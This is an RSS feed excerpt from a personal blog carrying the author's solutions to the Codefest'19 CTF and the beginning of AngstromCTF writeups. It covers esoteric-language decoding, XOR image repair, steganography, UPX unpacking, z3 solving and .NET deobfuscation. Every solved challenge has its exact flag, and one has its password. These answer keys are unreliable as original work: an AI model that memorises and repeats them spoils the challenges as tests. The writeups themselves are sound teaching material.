    byte &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; disass&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*(obj.{field}) = &amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(binascii&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unhexlify(byte)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), sep&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is all. Thanks for reading!&lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Codefest’19 CTF Writeups</title>
      <link>https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/</link>
      <pubDate>Sun, 25 Aug 2019 19:13:05 +0000</pubDate>
      <guid>https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/</guid>
      <description>&lt;p&gt;The Capture the Flag event for &lt;a href=&#34;http://codefest.tech&#34;&gt;Codefest’19&lt;/a&gt; was hosted from 8 pm, 23rd August 2019 to 12 noon, 24th August 2019 on Hackerrank.&lt;/p&gt;
&lt;p&gt;The contest link can be found &lt;a href=&#34;https://www.hackerrank.com/codefest19-ctf&#34;&gt;here&lt;/a&gt;. There were a total of &lt;strong&gt;1532&lt;/strong&gt; registrations and &lt;strong&gt;518&lt;/strong&gt; people who were successful in solving atleast one challenge.&lt;/p&gt;
&lt;p&gt;So, onto the writeups.&lt;/p&gt;
&lt;h3 id=&#34;welcome-to-codefest-19-intro-challenge100pts&#34;&gt;&lt;strong&gt;Welcome to Codefest 19! (Intro Challenge — 100pts)&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;This was the introductory challenge. I had tried to make it a bit difficult than the normal introductory challenges, but I felt that it proved to be a bit difficult for the beginners.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/13.png&#34; data-caption=&#34;The challenge&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/13.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The challenge
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;Here, first you had to join the telegram group linked in the proble. There you got the first half of the flag — **CodefestCTF{G3t_r3ady_**. For the other half there was a pinned message on the group.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The other half of the flag was uploaded on the contest page yesterday by accident. It has now been removed. Can you find it?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;For this you had to use &lt;a href=&#34;http://archive.org&#34;&gt;archive.org,&lt;/a&gt; there was a snapshot of the contest page created on 23rd Aug 2019. Viewing the &lt;a href=&#34;https://web.archive.org/web/20190823133528/https://www.hackerrank.com/codefest19-ctf&#34;&gt;snapshot&lt;/a&gt; got you the second half of the flag —&lt;strong&gt;f0r_C0def3stCTF-8fb34fjr4bs43ur8}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;So, the final flag is — &lt;strong&gt;CodefestCTF{G3t_r3ady_f0r_C0def3stCTF-8fb34fjr4bs43ur8}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;what-language-is-this-misc100pts&#34;&gt;What language is this? (Misc — 100pts)&lt;/h3&gt;
&lt;p&gt;This was basically a esoteric language question. The given text was —&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;iiisdsiiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiodddddddddddoioiodoiiiiiiiiiiiiiioiodddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiioddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiioiiiiiiiodddddddddodddddddddddddddddddddddddddddddddddddddddddddddddddoddddddddddddddddddddddddddddddddddddddsiiiiiiiiioddddddddoddddddoiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddoddddddddddddddddddddddddddddddddsiiisisdddddoddddddddddddddddddddddddddddodddddddddddddddddddoddddddddddddddddddddddddddddddddsiiisisoioiodoiiiiiiiiiiiiiioiodddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiioddddddddddddddddddddddddddddddddddddddddddddddsiiiio
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The language was &lt;a href=&#34;https://esolangs.org/wiki/Deadfish&#34;&gt;Deadfish&lt;/a&gt;. You could use an online decoder for that language, something like &lt;a href=&#34;https://www.dcode.fr/deadfish-language&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The final flag was — &lt;strong&gt;CodefestCTF{Welc0me_t0_C0defest19}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;gibberish-file-misc100pts&#34;&gt;Gibberish file (Misc — 100pts)&lt;/h3&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/2.png&#34; data-caption=&#34;The challenge&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The challenge
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The hint was in the problem statement. You had to reverse the file to find the flag. A simple one-line script could do it&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;output2.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;output.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The resulting had some text like&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ 𝝩𝗵𝙚 𝗳𝒍𝙖𝗴 𝒊𝙨 𝐋𝒊𝐓𝚬𝐫𝚨𝐋﹏𝕽𝜠𝓥Ｅℜ𝕊𝐢𝙣𝓖ꓸ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The flag was the ASCII analog of each unicode character.&lt;/p&gt;
&lt;p&gt;The flag was — &lt;strong&gt;CodefestCTF{LiTErAL_REVERSinG}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;image-corruption-forensics100pts&#34;&gt;Image Corruption (Forensics — 100pts)&lt;/h3&gt;
&lt;p&gt;In the challenge, you were given a link to a corrupted &lt;em&gt;.bmp&lt;/em&gt; &lt;a href=&#34;https://drive.google.com/file/d/1t5d_lKkdoG1aicBJYhM8wqh7Ispk0G4U/view&#34;&gt;file&lt;/a&gt;. On viewing the file in a hex editor, and also checking the magic bytes —&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/3.png&#34; data-caption=&#34;Hex view of the image&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/3.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Hex view of the image
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;We know there is something to do with “matrix”. Also for a normal &lt;em&gt;.bmp&lt;/em&gt; file the initial magic bytes are 424d 8a44 1300. XORing this with the first six bytes of the given file also gives you “matrix”. So to solve the challenge, we XOR the whole image with “matrix”.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/391d4103c8175cd3484c286d7c51dfd7.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Run the script, and you obtain the correct file.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/4.jpeg&#34; data-caption=&#34;The correct file&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/4.jpeg&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The correct file
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The flag is — &lt;strong&gt;CodefestCTF{f1l35_h4v3_m461c_by735}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;mail-capture-steganography-100pts&#34;&gt;Mail capture (Steganography— 100pts)&lt;/h3&gt;
&lt;p&gt;You are presented with a “email friendly text”. This was encoded to unicode by a tool called &lt;strong&gt;uuencode&lt;/strong&gt;. It can be decoded by using &lt;strong&gt;uudecode&lt;/strong&gt;, a decoder for such formats. Running &lt;strong&gt;uudecode&lt;/strong&gt; with the file gives an output file called “flag_encoded”. The contents are the flag — &lt;strong&gt;CodefestCTF{7h15_15_4_c001_3nc0d1n9}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;cats-are-innocent-right-steganography-500pts&#34;&gt;Cats are innocent, right? (Steganography— 500pts)&lt;/h3&gt;
&lt;p&gt;This challenge was based on LSB steganography. I had used a tool called &lt;a href=&#34;https://github.com/DimitarPetrov/stegify&#34;&gt;&lt;strong&gt;stegify&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The challenge image -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/5.jpeg&#34; data-caption=&#34;Challenge image&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/5.jpeg&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Challenge image
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;On running the command -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;stegify -op decode -carrier cute_kittens.jpg -result hello&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We get a &lt;em&gt;hello.zip&lt;/em&gt; file which was embedded in the LSBs of the image. The zip file had a file inside it but that was of no use. The flag was appended at the end of the zip file.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/6.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/6.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The flag is appended at the end of the zip file&lt;/p&gt;
&lt;p&gt;The flag is — &lt;strong&gt;CodefestCTF{h1d1ng_b3h1nd_1nn0c3nt_k1tt3n5}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;weird-encoding-misc-200pts&#34;&gt;Weird encoding (Misc— 200pts)&lt;/h3&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/7.png&#34; data-caption=&#34;The challenge&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/7.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    The challenge
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;We are given the following “encoding”&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x85+1x1+0x14
0x7+1x1+0x7+1x1+0x9+1x2+0x3+1x4+0x3+1x1+0x6+1x5+0x1+1x1+0x2+1x1+0x1+1x2+0x13+1x2+0x3+1x1+0x8+1x1+0x5+1x2+0x8
0x1+1x5+0x18+1x3+0x3+1x1+0x16+1x2+0x1+1x1+0x5+1x2+0x2+1x1+0x3+1x1+0x4+1x2+0x3+1x3+0x3+1x1+0x2+1x2+0x4+1x3+0x8
0x3+1x1+0x7+1x1+0x11+1x2+0x1+1x1+0x3+1x5+0x12+1x1+0x2+1x1+0x7+1x1+0x10+1x1+0x3+1x2+0x1+1x1+0x5+1x3+0x4+1x1+0x1+1x2+0x2+1x1+0x4
0x3+1x1+0x3+1x1+0x7+1x2+0x3+1x1+0x2+1x1+0x2+1x1+0x7+1x1+0x11+1x2+0x2+1x2+0x5+1x2+0x10+1x1+0x3+1x1+0x2+1x1+0x3+1x2+0x2+1x1+0x4+1x4+0x7
0x3+1x1+0x3+1x1+0x3+1x1+0x1+1x3+0x10+1x1+0x7+1x1+0x7+1x1+0x3+1x1+0x3+1x1+0x1+1x2+0x2+1x3+0x8+1x5+0x4+1x1+0x3+1x9+0x1+1x3+0x7
0x3+1x1+0x3+1x3+0x1+1x1+0x1+1x4+0x9+1x1+0x6+1x2+0x2+1x1+0x7+1x2+0x3+1x1+0x2+1x1+0x4+1x1+0x10+1x1+0x6+1x1+0x7+1x1+0x7+1x4+0x4
0x5+1x1+0x1+1x1+0x1+1x1+0x1+1x1+0x4+1x2+0x7+1x2+0x3+1x4+0x11+1x1+0x4+1x1+0x2+1x1+0x3+1x2+0x6+1x1+0x3+1x1+0x6+1x1+0x7+1x1+0x1+1x1+0x1+1x5+0x7
0x7+1x1+0x1+1x1+0x1+1x1+0x2+1x3+0x7+1x5+0x16+1x1+0x4+1x1+0x2+1x1+0x1+1x3+0x3+1x6+0x2+1x1+0x2+1x1+0x1+1x5+0x5+1x1+0x2+1x1+0x4+1x1+0x7
0x18+1x5+0x13+1x6+0x27+1x1+0x14+1x1+0x2+1x2+0x2+1x1+0x5+1x1+0x2
0x1+1x1+0x5+1x1+0x4+1x1+0x3+1x1+0x8+1x1+0x8+1x1+0x9+1x1+0x8+1x1+0x5+1x1+0x17+1x1+0x10+1x3+0x9
0x68+1x1+0x11+1x1+0x19

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here a bit of observation was required to figure out that the “x” symbol mean concatenation &lt;em&gt;n&lt;/em&gt; number of a character, like 0x5 will mean 00000. And “+” would mean concatenation of two strings of different type. Also, one will also have to decide on 0 representing 255 255 255 i.e. the color &lt;em&gt;white&lt;/em&gt; and 1 representing 0 0 0 , i.e. the color &lt;em&gt;black&lt;/em&gt;. You could have experimented with both combinations but eventually you would get the correct mapping.&lt;/p&gt;
&lt;p&gt;The following script can help generate the image.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/9f262ca29ec6bcb5c8b66e1feb95cf6e.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The obtained image is this -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/8.png&#34; data-caption=&#34;You may want to zoom in a bit&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/8.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    You may want to zoom in a bit
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The flag is — &lt;strong&gt;CodefestCTF{This_15_7h3_f14g}&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;linux-re-1-reversing300pts&#34;&gt;Linux RE 1 (Reversing — 300pts)&lt;/h3&gt;
&lt;p&gt;This challenge was a bit difficult to solve using a debugger due to some anti-debugging techniques that were implemented. Also, initially the ELF was packed using UPX, which was visible as a string when you would have run the &lt;strong&gt;strings&lt;/strong&gt; command. So, first use&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;upx -d&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;with the ELF to decompress it.&lt;/p&gt;
&lt;p&gt;For the next part, You could use a disassembler or a decompiler to get the source code and eventually reverse the binary. The executable was generated from a C++ file hence it was a bit messy to view in a decompiler.&lt;/p&gt;
&lt;p&gt;The decompiled view (using Ghidra) of the main function (the interesting part) is the following -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/9.png&#34; data-caption=&#34;Decompiled main function&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/9.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Decompiled main function
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The &lt;em&gt;key_int&lt;/em&gt; and &lt;em&gt;enc_int&lt;/em&gt; are global variables. The main logic of the ELF is in the &lt;strong&gt;rahasya&lt;/strong&gt; function.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/10.png&#34; data-caption=&#34;Decompiled rahasya function&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/10.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Decompiled rahasya function
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;This basically takes two strings and XORs them and returns the XORd string. The two strings it takes as input are the user input and the &lt;em&gt;key_int&lt;/em&gt; string. The XORd data is matched with the &lt;em&gt;enc_int&lt;/em&gt; data.&lt;/p&gt;
&lt;p&gt;So, basically to reverse the binary you have to XOR both the &lt;em&gt;key_int&lt;/em&gt; and &lt;em&gt;enc_int&lt;/em&gt; data.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/11.png&#34; data-caption=&#34;enc_int data&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/11.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    enc_int data
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/12.png&#34; data-caption=&#34;key_int data&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2019-08-25_codefest19-ctf-writeups/images/12.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    key_int data
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;Basically,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;int &lt;em&gt;enc_int[]&lt;/em&gt; = {80, 93, 3, 67, 3, 86, 11, 110, 64, 2, 90, 27, 84, 28, 110, 75, 3, 69, 52, 6, 11, 5, 80, 88, 90, 88};&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;int &lt;em&gt;key_int[]&lt;/em&gt; = {49, 51, 51, 55, 107, 101, 121};&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;XOR both of them, and you get &lt;em&gt;an0th3r_s1mp1e_x0r_cr4ckm3&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So, the flag is &lt;strong&gt;CodefestCTF{an0th3r_s1mp1e_x0r_cr4ckm3}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;linux-re-2-reversing500pts&#34;&gt;Linux RE 2 (Reversing — 500pts)&lt;/h3&gt;
&lt;p&gt;Again we open the file in IDA or any disassembler and/or decompiler we see that the input should satisfy a set of conditions on the letters of the input.&lt;/p&gt;
&lt;p&gt;The conditions can be translated as&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/c0c225fa5daa05da85bb0534dc5438a9.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;We can use some kind of SMT solver like z3 to find the password.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/bccc43909e68ddd7d219f59fc48da4c5.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The obtained password is — &lt;em&gt;shouldve_used_some_tool&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The flag, hence, is &lt;strong&gt;CodefestCTF{shouldve_used_some_tool}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;windows-re-reversing500pts&#34;&gt;Windows RE (Reversing — 500pts)&lt;/h3&gt;
&lt;p&gt;In this problem, the Windows exe file (actually a .NET file) that was provided, was packed with &lt;a href=&#34;https://yck1509.github.io/ConfuserEx/&#34;&gt;ConfuserEx&lt;/a&gt;. We can use &lt;a href=&#34;https://github.com/CodeShark-Dev/NoFuserEx&#34;&gt;NoFuserEx,&lt;/a&gt; which is a free deobfuscator for this packer.&lt;/p&gt;
&lt;p&gt;Then, open the executable in any .NET decompiler like dnSpy and check the &lt;strong&gt;Form&lt;/strong&gt; function to get the password as well as the flag.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Password — thisisa1337password&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The flag — &lt;strong&gt;CodefestCTF{51mp13_1npu7_v411d4710n_8u7_w17h_4_7w157}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h3 id=&#34;no-fatshaming-web600pts&#34;&gt;No Fatshaming (Web — 600pts)&lt;/h3&gt;
&lt;p&gt;I’ll cheat a bit here xD. You can read my friend Yashit’s &lt;a href=&#34;https://medium.com/@yashitmaheshwary/no-fatshaming-web-challenge-writeup-codefest19-ctf-1deea5a2ea49&#34;&gt;awesome writeup&lt;/a&gt; on the challenge.&lt;/p&gt;
&lt;p&gt;Flag is — &lt;strong&gt;CodefestCTF{1AmTeHHHAX00Rr4uj8rfi4e$%y5yhrf}&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Hope you had a great time solving the challenges and that it was a good learning experience for beginners.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>AngstromCTF Writeups</title>
      <link>https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/</link>
      <pubDate>Fri, 23 Mar 2018 12:37:04 +0000</pubDate>
      <guid>https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/</guid>
      <description>&lt;p&gt;These are the writeups to the problems I solved during the AngstromCTF.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;misc&#34;&gt;MISC&lt;/h2&gt;
&lt;p&gt; &lt;br&gt;
&lt;strong&gt;1. Waldo1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We are given a zip file — flags.zip containing flags of countries. The file flag5.png, we see on opening has the flag.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/2.png&#34; data-caption=&#34;Flag-Waldo1&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2018-03-23_angstromctf-writeups/images/2.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Flag-Waldo1
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt; &lt;br&gt;
&lt;strong&gt;2. Waldo2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In this problem, we are given multiple flag images in a folder. Judging by the problem, it seems that one image is different. We see the md5 hash of the few files which are the same-&lt;strong&gt;9f6e902c233020026caf0ebbb1cf0ff5&lt;/strong&gt;. So we write the following script-&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/06c29b45da61157827bb20a355faa6c9.js&#34;&gt;&lt;/script&gt;

